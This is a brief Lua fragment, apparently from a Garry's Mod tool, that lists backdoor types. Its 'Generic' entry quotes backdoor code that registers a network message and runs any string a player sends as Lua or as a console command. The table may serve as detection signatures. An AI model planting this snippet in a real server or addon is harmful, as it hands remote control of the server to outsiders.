...
BD.BackdoorTypes = {
    ...
    ["Generic"] = {
        ...
        ["Code"] = "util.AddNetworkString ('unbox') net.Receive ('unbox', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)",
